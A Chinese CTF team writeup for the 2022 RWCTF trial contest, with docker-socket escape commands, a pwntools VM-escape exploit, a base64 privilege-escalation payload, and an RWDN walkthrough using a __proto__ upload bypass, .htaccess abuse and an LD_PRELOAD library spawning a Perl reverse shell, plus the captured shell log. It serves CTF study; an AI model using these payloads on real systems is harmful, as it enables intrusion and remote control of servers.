---
title: 2022 RWCTF体验赛 SU Writeup
tags: ["RWCTF"]
date: 2022-01-30 16:50:17
slug: "rwctf-2022-su-wu"
---
本次2022 RWCTF 体验赛 我们 SU 取得了第一名 🏆的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：[suers_xctf@126.com](mailto:suers_xctf@126.com)或直接联系书鱼(QQ:381382770)
以下是我们 SU 本次 2022 RWCTF的 writeup 以及RWCTF RWDN 复现解析

<!--more-->
![](1.png)


# pwn
### Remote-debug-Server
直接 remote get /flag flag 

### Be-a-Docker-Escaper
docker逃逸,参考 [这篇文章](https://www.anquanke.com/post/id/179623#h2-3) 发现题目提供的dockerfile中有  `docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu # You are here!`这一行 将docker.sock映射到docker中的/s目录下,因此和文章中一样操作即可
```bash
apt update
apt install docker.io
mkdir /aa
docker -H unix:///s/docker.sock run -v /:/aa -i ubuntu /bin/bash
```
Docker run命令-it的话会出现报错` the input device is not a TTY `
搜索后发现去掉-t就行了
之后cd /aa 即可进入映射的宿主机目录cat flag

### Be-a-VM-Escaper
虚拟机题目 给了源码`https://github.com/erratic-c-programmer/lvm`
审源码的时候发现栈的检测很严格,但是reg寄存器数组没有检测负溢出.
同时reg的索引是longlong类型,可以负溢出修改低地址的内容
动态调试发现reg数组低地址的局部变量只有`cinstr`即rip的内容,因此无法动态修改虚拟机的栈和代码.
通过负索引获取栈地址和libc地址,通过sub命令算出偏移,然后通过修改rip使vm跳转到布置好的代码处写printf函数调用的`io_file_jumps`vtable中的_IO_xputs函数指针为one_gadget即可.
布置代码我的选择是正常写在reg数组中,reg数组可以写三条指令,刚好够load + store + print
```python
from pwn import *
context.log_level = 'DEBUG'
# sh = process('./lvm')
sh = remote("101.132.235.138",1337)
libc = ELF('./libc-2.31.so')
len = 0
def push(num):
    global len
    payload =""
    payload += str(1) + '\n'
    payload += str(num) + '\n'
    len +=1 
    return payload
def store(idx):
    global len

    payload =""
    payload += str(4) + '\n'
    payload += str(idx) + '\n'
    len +=1 

    return payload
def load(idx):
    global len
    len +=1 
    payload =""
    payload += str(5) + '\n'
    payload += str(idx) + '\n'
    return payload
def show():
    global len
    len +=1 
    return str(22) + '\n'
def sub():
    global len
    len +=1 
    return str(7) + '\n'
def add():
    global len
    len +=1 
    return str(6) + '\n'
def div():
    global len
    len +=1 
    return str(9) + '\n'
def nop():
    return str(0) + '\n'
# 0x7FFFF7EA7C7E
# 0x7FFFF7EA7C81
# 0x7FFFF7EA7C84
payload = ''
payload += load(-3)
payload += show()
payload += push(0x13900)
payload += sub()
payload += store(0)
payload += load(-35)
payload += show()
payload += push(0x64ebf)
payload += sub()
payload += push(0xe6c81) # onegadget 
payload += add()
payload += store(1)
payload += push(0xe6c81)
payload += sub()
payload += push(0x1ED4D8) # xputn
payload += add()
payload += store(3)
payload += load(3)
payload += load(0)
payload += sub() 
payload += push(8)
payload += div() # off = (xputn - stack) / 8
payload += store(6)
payload += push(4)
payload += store(5)
payload += push(0)
payload += store(7)
payload += push(22)
payload += store(8)
payload += push(5)
payload += store(2)
payload += push(1)
payload += store(3)
payload += push(0)
payload += store(4)
payload += load(0)
payload += push(0x8)
payload += sub()
payload += store(-3)



# payload += store()

nops = (str(0) + '\n')* (0x100 - len)
# gdb.attach(sh,'b * $rebase(0x141B)')
sh.sendline(str(len))
sh.sendline(payload)

# stack_base = int(sh.recvline(),10) - 0x13900
# log.success("stack = " + hex(stack_base))
# libc_base = int(sh.recvline(),10)- 0x64ebf
# log.success("libc_base = " + hex(libc_base)) 

# io_list_all = libc_base + 0x1ec5a0
# recurive = libc_base + 0x23CF68
# xputn = libc_base + 0x92750
# one_gadget = 
sh.interactive()
```
### Phonograph
提权exp
```
base64 -d  > /tmp/create.sh <<EOF
IyEvYmluL2Jhc2gKYWxwaGE9ImEgYiBjIGQgZSBmIDAgMSAyIDMgNCA1IDYgNyA4IDkiCgpmb3Ig
aSBpbiAkYWxwaGE7IGRvCmZvciBqIGluICRhbHBoYTsgZG8KZm9yIGsgaW4gJGFscGhhOyBkbwpm
b3IgbCBpbiAkYWxwaGE7IGRvCiAgICBta2RpciAtcCAvdG1wL2xvZ18kaSRqJGskbAogICAgbG4g
LXMgL2V0Yy9sZC5zby5wcmVsb2FkICAvdG1wL2xvZ18kaSRqJGskbC9kaWFyeS50eHQKZG9uZQpk
b25lCmRvbmUKZG9uZQ==
EOF

chmod +x /tmp/create.sh

# gcc inject.c -fPIC -shared -o exp.so -nostdlib
#
# #include <stdio.h>
# #include <stdlib.h>

# __attribute__((constructor)) void exploit()  {
#     char buf[1000];
#     if(!getenv("one")) {
#         return;
#     }
#     unsetenv("one");
#     setuid(0);
#     setgid(0);
#     system("chmod 777 /flag.txt");
# } 


base64 -d > /tmp/exp.so.gz <<EOF
H4sICAsf7GEAA2V4cC5zbwDtW99vFFUUPrOz/QGFdlEMRYxuDCqQMCwCaakC25ZtVy1QC/UXD8O2
O3SXdHeb7axueUA0SjDaBBNQX8RgQkI0Jv5M+qCxxpjoo3+CDyQYTSwYefDB8d6Zc2bn3p0JaAL6
cL9k9pvz3fvde2fu7My0e+6LmZGhmKYBQYfdwKOPE16cRv2Z7X4VpvVCB/u8C1a7deMQjZNxkQHb
5b6WQCxzhyZy0Oc2lURd4s9B5KCvlW0Lhhcv7Bb5tCYy+WLoW0Tf4m6R05rI7WiP43Yp5sUyy8OX
fd9jPZnXg8h0Wg9etvP/pr9R9HVjgcxR/T3JfK1w86DpHcP+ouYhq4lM0xHHNvg1M7x/nM/LItf0
QPlqjHn5Vx8+9d7bF85/erb+9I6riet7rr6/c5LXo/mk64Eb47TP8Hr9jZdvdByJEH1ZhP5QhJ6M
0NdG6Hy8d8By/3t5mAqs+sx0pWjDlGVb5eehVp71dhjVinlOU5zmZm2rBI3z7B8/ojvtcRs0zrk7
zoAeC+gbAroe0FMBPXhf6A3oLSHHp6CgoKCgoKCgoKBw6+HsiKUArjkP6Iy67oPfu+79s8ALrv38
k+M4Z9xYc+Mf/Tjmxt/4se7Gn/hx3I0vUMxa/2gLb30vAMYXpfhdKT4nxfPBeDz72uXsS78usW6z
87v6ugCuXGR9ZV9dtHuZsJELrzDha34cC/zjyhdi+BavPr9L5zWPs/1ftDM/fPtfnH4FBQUFBQUF
BQUFBQUFhduCStmCyUKpkk/29PQktxydzk0Zdt0GbZ3+CP/Nl/9pf+U3xznCOLvkOKcZv8M4jf7V
yNrxMdDqCW3dirb2MxrAPeBto6yu+1tlpjNxKja4sjU2xmp4vyc/yraT2DZ0JoY6ux/v6nih/STs
ubtv07b193OZ/9yZZ9sCqzd6W86IgoKCgoKCgoKCgoKCwv8Ra5Epr3UdxpTf/MdfToXzEiavUu7p
IiatUg5sN8bLMcb0ZOigcmQ/1zXtEeXE1pHp7+E25DU0nrioL+niOKn9ZVJ8q0F57DISmGecRE7R
egDkUeThwcG+5IbxiVrZriV3GtuM1OatPTU33Hri4ZSR2r7Rk29iLDpofr66qMf8/HdR1/15FfW4
P5+i3uLPu6i3+vMh6m3+vIl6e2iSts5m70io3sjbFvWORkK+oK/w8+9FfSWkQ/VO//oX9a7Q+dX5
4NNh+qomzVtvcdVprh2uL3c9zf3e6X42H9eDbv3m8fD/DYXlwWci9JEI/WCE/hyE59NPRNSHYvmY
NWkbk2DufXZ//77HBsE0h/ePm5msOTTWvy9jZveOgTk8cmCgf8Q8MDR0MHPIPNQ/MJIxGzn5mKOP
yfiYmk8J/JiwD8bsXMnOTTC2qx4XaK9csS1jqlwzZqqVGatqzwWkiVpxOr+ZNeBGhdxsAYz8XJk1
5rFdBaNqTed4gHsz0zbwD2PWmgTDtuosrFbyOTsHhlUwj1ZzJcss5KuNCIxiuWibuWo1N+c2mysV
mXWqYnuNTVZKJatsh52/fwh+Hw+uOYhaz0Jol2JD8ketoyHIX/N+tl13nAr56T6zJPnJJ/f/BHjP
DvLT/Yj4Eur8eaRB83OAX7d6wE/3LWJ6PhE0KT6MY/PHr4tM/cjjJ93CsgEqj4tMzztalyP7j4G0

```

# WEB
Hhhm大哥说太简单了，就一句话一题概括

- log4flag：log4shell 绕一下关键字过滤
- Be-a-Database-Hacker：redis主从复制
- the Secrets of Memory：spring actuator heapdump内存提取关键字符
- Flag Console：weblogic cve
- baby flaglab：gitlab前台rce
- Be-a-Database-Hacker：h2 log4j2反序列化
- Java Remote Debugger：java调试器rce
- Ghost Shiro：tomcat ajp任意文件读+commonbeanuntil1.8.3反序列化链

# Realworld CTF 2022 - RWDN 复现解析
## 前情提要 

RWDN dockerfile：这份 dockerfile 是从出题人手中拿到的，和现实的题目有一点点差距；原文提到的 `realworld2022_RWDN.zip` 当前仓库未包含，所以这里不再保留失效下载链接。

使用 `sudo docker compose up` 等待镜像制作完成就会自动启动了

题目会部署在 127.0.0.1 31337 和 31338 两个端口 和正式比赛的情况 没有区别

## 拿到题目 

### source 审计

先查看 HTML 源码 很快就能看到注释中写的 

```
<body>
<!-- /source -->
```

很显然是提示我们去访问 /source 目录

curl 看一下 是 js 源码 这里顺手存到 source 文件里

注意: 源文件无注释 我这里为了提示也是为了分析题目 所以这里部分需要注意的地方 我添加了注释

```bash
$ curl 127.0.0.1:31337/source | tee code.js
const express = require('express');
const fileUpload = require('express-fileupload');
const md5 = require('md5');
const { v4: uuidv4 } = require('uuid');
const check = require('./check'); // 这里引入了 check 不知道是什么 但是是自定义的
const app = express();

const PORT = 8000;

app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');

app.use(fileUpload({
  useTempFiles : true,
  tempFileDir : '/tmp/',
  createParentPath : true
}));

app.use('/upload',check()); // 这里调用了 check 应该是 在 ./check 的一个函数

// 看到 这里用到了下面用到了 获取源码的方法
app.get('/source', function(req, res) { 
  if (req.query.checkin){ // 让 checkin == 1 
    res.sendfile('/src/check.js'); // 这里我们可以猜测之前 check 的意思 应该就是这个文件
    							// 因此接下来我们要请求拿一下 check.js 但是不急 我们接着看
  }
  res.sendfile('/src/server.js'); // 就是我们当前的文件
});

// 我们的根目录 生成了一个 formid
app.get('/', function(req, res) {
  var formid = "form-" + uuidv4();
  res.render('index', {formid : formid} );
});

// 这里是上传点  一般这里大家都会警觉
app.post('/upload', function(req, res) {
  let sampleFile;
  let uploadPath;
  let userdir;
  let userfile;
  // 样本文件 获取 用的是 req.query.formid 注意可以是数字 不一定是 字符串
  sampleFile = req.files[req.query.formid];
  // 这里处理 文件 hash 用的 md5 分别计算了 文件 hash 和 上传者的地址
  // node 会获取 ::ffff:{ipv4} 作为你的 ip 地址 
  userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
  userfile = sampleFile.name.toString(); 
  // 文件名就是 name 字段 不是 filename 字段 正常情况是 你的 formid
  
  if(userfile.includes('/')||userfile.includes('..')){ 
      return res.status(500).send("Invalid file name");
  }
  // 上传到的地址 注意这里是绝对地址 
  uploadPath = '/uploads/' + userdir + '/' + userfile;
  sampleFile.mv(uploadPath, function(err) {
    if (err) {
      return res.status(500).send(err);
    }
    // 这里提到了第二个端口 
    // 这里也说明了 上传的文件你可以在这个地址访问到 
    // 文件上传 getshell 基本都要用到 这个地址访问 然后让服务器执行
    res.send('File uploaded to http://47.243.75.225:31338/' + userdir + '/' + userfile);
  });
});

app.listen(PORT, function() {
  console.log('Express server listening on port ', PORT);
});

```

### check 审计

接下来 看看我们的 check.js 

```js
$ curl 127.0.0.1:31337/source?checkin=1 | tee check.js
module.exports = () => {
    return (req, res, next) => {
      if ( !req.query.formid || !req.files || Object.keys(req.files).length === 0) {
        // 确认你有上传
        res.status(400).send('Something error.');
        return;
      }
        // 对每个文件的 key 进行检查 (其实这里有个例外 __proto__ 是个例外)
      Object.keys(req.files).forEach(function(key){
        var filename = req.files[key].name.toLowerCase(); 
        var position = filename.lastIndexOf('.');
        if (position == -1) {
          return next();
        } // 如果没有 . 就下一个文件 这里其实也有个 bypass 点位 也就是上传两个文件 用第一个 无后缀的安全文件 bypass 
        var ext = filename.substr(position);
        var allowexts = ['.jpg','.png','.jpeg','.html','.js','.xhtml','.txt','.realworld'];
        if ( !allowexts.includes(ext) ){ // 确认安全文件名后缀
          res.status(400).send('Something error.');
          return;
        }
        return next(); // 所有检查完毕后 就 返回下一个文件
      });
    };
  };

```

### 看一眼 31338 端口

这里可以看一眼 31338 端口 然后 curl 一下

```bash
$ curl 127.0.0.1:31338 -v
*   Trying 127.0.0.1:31338...
* Connected to 127.0.0.1 (127.0.0.1) port 31338 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:31338
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 27 Jan 2022 15:48:27 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Last-Modified: Thu, 20 Jan 2022 09:18:15 GMT
< ETag: "31-5d5fffb6aa3c0"
< Accept-Ranges: bytes
< Content-Length: 49
< Content-Type: text/html
< 
* Connection #0 to host 127.0.0.1 left intact
Welcome to my CDN! Execute /readflag to get flag.  
```

这里就是个 普通 apache 而上面的两个 则是 Express 

## 思路和利用

既然上传这里 有问题 那么就试试上传 看看能不能弄到点什么

很显然 getshell 的任何 php pl 脚本代码都是不能成功利用的 就是个 简简单单的 纯纯的 Apache 服务器 

### 第一部分

既然是 apache 目标, 自然 [.htaccess](https://httpd.apache.org/docs/2.4/howto/htaccess.html) apache.conf 这种配置文件 很显然就变成了我们的目标

> 你或许以为直接 cgi script 进行一把梭就完事了 很显然 这里服务器 默认是没有开启的 (因为他是 docker 而且几乎是默认的 apache )

既然是 Apache 那么翻翻 apache 文档

#### ErrorDocument

知识点 1 [ErrorDocument](https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errordocument) 错误文档 可以看到 context 运行上下文的中存在 .htaccess

可以这样利用

```
ErrorDocument 404 %{file:/etc/apache2/apache2.conf}
```

保存为 .htaccess 然后传上去

无用的知识点 [ErrorLog](https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errorlog) 也能执行命令 但是很显然 上下文环境阻止了你  这里其实可以拿来出题 哈哈哈

同样 

- [customlog](https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_log_config.html#customlog) 
- [globallog](https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_config.html#globallog)
- [forensiclog](https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_forensic.html#forensiclog)
- [transferlog](https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_config.html#transferlog)

都具有 pipe 形式

滥用 htaccess 以及其中一些模块的方法 https://github.com/wireghoul/htshells

> 额外找到了一些 相关的利用方法 
>
> SetEnv LD_PERLOAD
>
> https://www.freebuf.com/articles/web/192052.html
>
> https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD

#### 上传文件 

这里直接贴代码 

```python
import requests
import hashlib

target_ip = "127.0.0.1"
target_render_port = 31338
target_upload_port = 31337

upload_file = ".htaccess"
normal_file = "a.txt"

request_sender_ip = "172.18.0.1" 
request_ip = "::ffff:{}".format(request_sender_ip)

# 这里是为了好看 跟踪一下请求
def print_request(response):
    print("request form")
    print("=========================================================")
    print(response.request.method, response.request.url)
    for header_key in response.request.headers.keys():
        print("{}: {}".format(header_key, response.request.headers[header_key]))
    body = response.request.body
    if body == None:
        print("")
    else:
        print( body.decode())
    print("=========================================================")

def print_response(response):
    print("response form")
    print("=========================================================")
    print(response.status_code, response.url)
    for header_key in response.headers.keys():
        print("{}: {}".format(header_key, response.headers[header_key]))
    print("")
    print(response.text)
    print("=========================================================")

def md5(string):
    return hashlib.md5(string.encode()).hexdigest()

# 计算上传点
def calc_upload_path(upload_file, form_id ): # form_id 是无用的 无所谓传什么
    """
    # 对应的 js 代码
    userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
    userfile = sampleFile.name.toString();
    if(userfile.includes('/')||userfile.includes('..')){
      return res.status(500).send("Invalid file name");
    }
    uploadPath = '/uploads/' + userdir + '/' + userfile;
    """
    file_md5 = hashlib.md5(open(upload_file,'rb').read()).hexdigest()
    userdir  = md5(md5(request_ip)+file_md5)
    userfile = form_id # 这里其实无用 
    # upload_path = '/uploads/' + userdir + '/' + userfile # the realworld ctf Env
    upload_path = '/' + userdir + '/'
    return upload_path

def main():
    
    ## STEP 1 get formid if you need
    uplaod_url1 = "http://{}:{}/".format(target_ip, target_upload_port)
    r = requests.get(uplaod_url1)
    form_id = r.text.split("action='")[1].split("'")[0]
    real_form_id = form_id.split('/upload?formid=')[1]
    print("you should use this id: ",real_form_id)

    ## STEP 2 upload error file
    # 方法 1 多文件上传绕过
    """
    # real_form_id = upload_file
    upload_url2 = "http://{}:{}/upload?formid={}".format(target_ip,target_upload_port,real_form_id)
    upload_file_id = real_form_id
    files = {
            real_form_id : open(normal_file,'r'),
            real_form_id : open(upload_file,'r'),
    } 
    # need uplaod 2 same name file as bad request 
    # 可以这么发包 塞入两个文件 但是很显然 这里前一个文件会被后一个文件盖掉 
    # 倒是强行可以通过 自己定义写多部分 来进行上传 但是代码复用度不好
    # 所以你会发现 你最后只上传了一个文件
    """
    # 方法 2 proto 大魔法
    upload_url2 = "http://{}:{}/upload?formid={}".format(target_ip,target_upload_port,"1")
    files = {
        "__proto__": open(upload_file,"r"), 
        "decoy":("decoy","random"),
    }
    """
    原理参照一个小哥 在 discord 中发的内容: 如下
    the __proto__ file is not checked because Object.keys does not include properties from the prototype, 
    but since the prototype is now an array we can use formid=1 to access that file again in the upload function
    """
    r2 = requests.post(upload_url2,files=files)
    print_request(r2)
    print_response(r2)

    ## STEP 3 get the response
    access_path = "http://{}:{}".format(target_ip,target_render_port) + \
            calc_upload_path(upload_file,real_form_id) + "NonExistFile" 
    # 强行 在这个目录下 404
    r3 = requests.get(access_path)
    print_request(r3)
    print_response(r3)
    ## 如果这里你的 .htaccess 文件 成功上传了 就会在这里 拿到 你 .htaccess 文件 ErrorDocument 指向的文件


if __name__ == '__main__':
    main()
```

### 第二部分

#### apache2.conf审计

>  文件很长 可以直接拉到最后 看

```
# This is the main Apache server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See http://httpd.apache.org/docs/2.4/ for detailed information about
# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
# hints.
#
#
# Summary of how the Apache 2 configuration works in Debian:
# The Apache 2 web server configuration in Debian is quite different to
# upstream's suggested way to configure the web server. This is because Debian's
# default Apache2 installation attempts to make adding and removing modules,
# virtual hosts, and extra configuration directives as flexible as possible, in
# order to make automating the changes and administering the server as easy as
# possible.

# It is split into several files forming the configuration hierarchy outlined
# below, all located in the /etc/apache2/ directory:
#
#       /etc/apache2/
#       |-- apache2.conf
#       |       `--  ports.conf
#       |-- mods-enabled
#       |       |-- *.load
#       |       `-- *.conf
#       |-- conf-enabled
#       |       `-- *.conf
#       `-- sites-enabled
#               `-- *.conf
#
#
# * apache2.conf is the main configuration file (this file). It puts the pieces
#   together by including all remaining configuration files when starting up the
#   web server.
#
# * ports.conf is always included from the main configuration file. It is
#   supposed to determine listening ports for incoming connections which can be
#   customized anytime.
#
# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
#   directories contain particular configuration snippets which manage modules,
#   global configuration fragments, or virtual host configurations,
#   respectively.
#
#   They are activated by symlinking available configuration files from their
#   respective *-available/ counterparts. These should be managed by using our
#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
#   their respective man pages for detailed information.
#
# * The binary is called apache2. Due to the use of environment variables, in
#   the default configuration, apache2 needs to be started/stopped with
#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
#   work with the default configuration.


# Global configuration
#

#
# ServerRoot: The top of the directory tree under which the server's
# configuration, error, and log files are kept.
#
# NOTE!  If you intend to place this on an NFS (or otherwise network)
# mounted filesystem then please read the Mutex documentation (available
# at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
# you will save yourself a lot of trouble.
#
# Do NOT add a slash at the end of the directory path.
#
#ServerRoot "/etc/apache2"

#
# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
#
#Mutex file:${APACHE_LOCK_DIR} default

#
# The directory where shm and other runtime files will be stored.
#

DefaultRuntimeDir ${APACHE_RUN_DIR}

#
# PidFile: The file in which the server should record its process
# identification number when it starts.
# This needs to be set in /etc/apache2/envvars
#
PidFile ${APACHE_PID_FILE}

#
# Timeout: The number of seconds before receives and sends time out.
#
Timeout 300

#
# KeepAlive: Whether or not to allow persistent connections (more than
# one request per connection). Set to "Off" to deactivate.
#
KeepAlive On

#
# MaxKeepAliveRequests: The maximum number of requests to allow
# during a persistent connection. Set to 0 to allow an unlimited amount.
# We recommend you leave this number high, for maximum performance.
#
MaxKeepAliveRequests 100

#
# KeepAliveTimeout: Number of seconds to wait for the next request from the
# same client on the same connection.
#
KeepAliveTimeout 5


# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}

#
# HostnameLookups: Log the names of clients or just their IP addresses
# e.g., www.apache.org (on) or 204.62.129.132 (off).
# The default is off because it'd be overall better for the net if people
# had to knowingly turn this feature on, since enabling it means that
# each client request will result in AT LEAST one lookup request to the
# nameserver.
#
HostnameLookups Off

# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog ${APACHE_LOG_DIR}/error.log  
# 这种地方是写不了的

#
# LogLevel: Control the severity of messages logged to the error_log.
# Available values: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the log level for particular modules, e.g.
# "LogLevel info ssl:warn"
#
LogLevel warn

# Include module configuration:
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

# Include list of ports to listen on
Include ports.conf


# Sets the default security model of the Apache2 HTTPD server. It does
# not allow access to the root filesystem outside of /usr/share and /var/www.
# The former is used by web applications packaged in Debian,
# the latter may be used for local directories served by the web server. If
# your system is serving content from a sub-directory in /srv you must allow
# access here, or in any related virtual host.
<Directory />
        Options FollowSymLinks
        AllowOverride ALL
        Require all denied
</Directory>

<Directory /usr/share>
        AllowOverride ALL
        Require all granted
</Directory>

<Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride ALL
        Require all granted
</Directory>

#<Directory /srv/>
#       Options Indexes FollowSymLinks
#       AllowOverride None
#       Require all granted
#</Directory>




# AccessFileName: The name of the file to look for in each directory
# for additional configuration directives.  See also the AllowOverride
# directive.
#
AccessFileName .htaccess

#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
<FilesMatch "^\.ht">
        Require all denied
</FilesMatch>


#
# The following directives define some format nicknames for use with
# a CustomLog directive.
#
# These deviate from the Common Log Format definitions in that they use %O
# (the actual bytes sent including headers) instead of %b (the size of the
# requested file), because the latter makes it impossible to detect partial
# requests.
#
# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
# Use mod_remoteip instead.
#
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent

# Include of directories ignores editors' and dpkg's backup files,
# see README.Debian for details.
ExtFilterDefine gzip mode=output cmd=/bin/gzip 
# 这个比较有东西哦 可以看到有命令执行了那么套用类似 PHP Mail bypass disable func 的思路进行利用

# Include generic snippets of statements
IncludeOptional conf-enabled/*.conf

# Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

### htaccess 滥用 挂载 LD_PERLOAD 

```c
// save as perload.c
// 编译 gcc perload.c  -fPIC -shared -o 1.so 
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;

__attribute__ ((__constructor__)) void preload (void) // 构建 预执行属性
{

    const char* cmdline = "perl -e 'use Socket;$i=\"172.18.0.1\";$p=8884;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'";

    // const char* cmdline = "perl /tmp/r3.pl > /tmp/r3pwn"
    
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }
    system(cmdline);
}

```

接下来上 python 利用

```python
import requests
import hashlib


target_ip = "127.0.0.1"
target_upload_port = 31337
upload_file = ".htaccess"
target_render_port = 31338
request_sender_ip = "172.18.0.1"
request_ip = "::ffff:{}".format(request_sender_ip)

# 还是 为了好看
def print_request(response):
    print("request form")
    print("=========================================================")
    print(response.request.method, response.request.url)
    for header_key in response.request.headers.keys():
        print("{}: {}".format(header_key, response.request.headers[header_key]))
    body = response.request.body
    if body == None:
        print("")
    else:
        print( body )
    print("=========================================================")

def print_response(response):
    print("response form")
    print("=========================================================")
    print(response.status_code, response.url)
    for header_key in response.headers.keys():
        print("{}: {}".format(header_key, response.headers[header_key]))
    print("")
    print(response.text)
    print("=========================================================")

def md5(string):
    return hashlib.md5(string.encode()).hexdigest()

# 计算上传路径
def calc_upload_path(upload_file, form_id ):
    """
    userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
    userfile = sampleFile.name.toString();
    if(userfile.includes('/')||userfile.includes('..')){
      return res.status(500).send("Invalid file name");
    }
    uploadPath = '/uploads/' + userdir + '/' + userfile;
    """
    file_md5 = hashlib.md5(open(upload_file,'rb').read()).hexdigest()
    userdir  = md5(md5(request_ip)+file_md5)
    userfile = form_id
    # upload_path = '/uploads/' + userdir + '/' + userfile # the realworld ctf Env
    upload_path = '/' + userdir + '/'

    return upload_path



def main():
    ## STEP 4 upload error
    # 上传 1.so
    sofile_path = uplaod_file("1.so")
    
    code = """SetEnv LD_PRELOAD "/var/www/html{}1.so"
SetOutputFilter gzip
ErrorDocument 403 /etc/apache2/apache2.conf
""".format(sofile_path)
    # 启用 gzip 过滤器 执行命令
    # 生成 htaccess
    htaccess_file_gen(code)
    # 输出 这里为了 debug
    print("sofile_path: ",sofile_path)
    # 上传 htaccess
    htaccess_path = uplaod_file(".htaccess")
    print("htaccess_path: ",htaccess_path)
    
    print("getshell exec with curl http://{}:{}".format(target_ip,target_render_port)+htaccess_path)

# 生成代码
def htaccess_file_gen(code):
    with open(".htaccess","w") as f:
        f.write(code)
    print("gen successfully")
 
# 上传文件 利用方法是上面 提到的
def uplaod_file(filename):
    uplaod_url1 = "http://{}:{}/".format(target_ip, target_upload_port)
    r = requests.get(uplaod_url1)
    form_id = r.text.split("action='")[1].split("'")[0]
    real_form_id = form_id.split('/upload?formid=')[1]
    print("you should use this id: ",real_form_id)

    upload_url2 = "http://{}:{}/upload?formid={}".format(target_ip,target_upload_port,"1")
    files = {
        "__proto__": open(filename,"rb"),
        "decoy":("decoy","random"),
    }
    r2 = requests.post(upload_url2,files=files)
    print_request(r2)
    print_response(r2)

    form_id = real_form_id
    return calc_upload_path(filename,form_id)


if __name__ == '__main__':
    main()
```

最后运行结果的 拿到 .htaccess 文件对应的地址 一个 curl 打过去就有了

当然记得起 netcat 的监听



## 最后 Getshell readflag

直接执行一个 readflag 的计算

```bash
└─$ nc -lvvp 8884        
listening on [any] 8884 ...
172.18.0.3: inverse host lookup failed: Unknown host
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.3] 54924
bash: cannot set terminal process group (31): Inappropriate ioctl for device
bash: no job control in this shell
www-data@a17ac98d17ba:/$ ls -al
ls -al
total 100
drwxr-xr-x   1 root root  4096 Jan 27 07:28 .
drwxr-xr-x   1 root root  4096 Jan 27 07:28 ..
-rwxr-xr-x   1 root root     0 Jan 27 07:28 .dockerenv
drwxr-xr-x   2 root root  4096 Jan  5 19:29 bin
drwxr-xr-x   2 root root  4096 Apr 24  2018 boot
drwxr-xr-x   5 root root   340 Jan 27 07:28 dev
drwxr-xr-x   1 root root  4096 Jan 27 07:28 etc
-r-x------   1 root root    39 Jan 20 09:19 flag
drwxr-xr-x   2 root root  4096 Apr 24  2018 home
drwxr-xr-x   1 root root  4096 May 23  2017 lib
drwxr-xr-x   2 root root  4096 Jan  5 19:29 lib64
drwxr-xr-x   2 root root  4096 Jan  5 19:27 media
drwxr-xr-x   2 root root  4096 Jan  5 19:27 mnt
drwxr-xr-x   2 root root  4096 Jan  5 19:27 opt
dr-xr-xr-x 334 root root     0 Jan 27 07:28 proc
-r-sr-xr-x   1 root root 13144 Jan 20 09:16 readflag
drwx------   1 root root  4096 Jan 27 07:44 root
drwxr-xr-x   1 root root  4096 Jan 27 07:28 run
drwxr-xr-x   2 root root  4096 Jan  5 19:29 sbin
drwxr-xr-x   2 root root  4096 Jan  5 19:27 srv
dr-xr-xr-x  13 root root     0 Jan 27 07:28 sys
drwxrwxrwt   1 root root  4096 Jan 27 07:28 tmp
drwxr-xr-x   1 root root  4096 Jan  5 19:27 usr
drwxr-xr-x   1 root root  4096 Jan 27 07:28 var
www-data@a17ac98d17ba:/$ readflag
readflag
bash: readflag: command not found
www-data@a17ac98d17ba:/$ ./readflag
./readflag
Solve the easy challenge first
(((((-854089)-(772258))+(5324))+(474988))-(-472881))
input your answer: -673154
ok! here is your flag!!
